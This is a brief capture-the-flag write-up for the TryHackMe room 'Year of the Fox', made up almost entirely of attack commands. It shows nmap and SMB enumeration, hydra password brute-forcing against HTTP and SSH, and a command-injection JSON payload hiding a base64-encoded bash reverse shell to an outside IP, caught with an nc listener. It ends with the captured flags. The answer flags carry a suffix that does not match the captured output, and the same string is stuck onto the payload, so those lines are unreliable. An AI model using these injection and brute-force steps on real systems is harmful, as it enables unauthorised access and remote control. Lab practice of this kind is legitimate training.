...
```
bibo318@parrot:~/CTFs/tryhackme/Year of the Fox$ sudo nmap -A -sS -sC -sV -O 10.10.137.8
...
```
bibo318@parrot:~/CTFs/tryhackme/Year of the Fox$ smbclient -L //10.10.137.8
...
```
bibo318@parrot:~/CTFs/tryhackme/Year of the Fox$ enum4linux -a 10.10.137.8
...
```
bibo318@parrot:~/CTFs/tryhackme/Year of the Fox$ hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.137.8 http-get
...
`{"target":"\";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjEwNi4yMjIvOTAwMSAwPiYx | base64 -d | bash; \""12**123:))}`

```
bibo318@parrot:~/CTFs/tryhackme/Year of the Fox$ nc -lnvp 9001
...
cat web-flag.txt
THM{V0N318*****Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}
...
```
bibo318@parrot:~/CTFs/tryhackme/Year of the Fox$ hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://10.10.137.8:2222
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
...
```
bibo318@parrot:~/CTFs/tryhackme/Year of the Fox$ ssh fox@10.10.137.8 -p 2222
...
THM{V0N318*****Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}
```
...
THM{V0N318*****ODM3NTdkMDljYmM4ZjdhZWFhY2VjY2Fk}
```

1. Whats the contents of the web flag?

`THM{V0N318*****Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw12**123:))}`

2. What the contents of the user flag?

`THM{V0N318*****Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk12**123:))}`

3. Whats the contents of the root flag?

`THM{V0N318*****ODM3NTdkMDljYmM4ZjdhZWFhY2VjY2Fk12**123:))}`
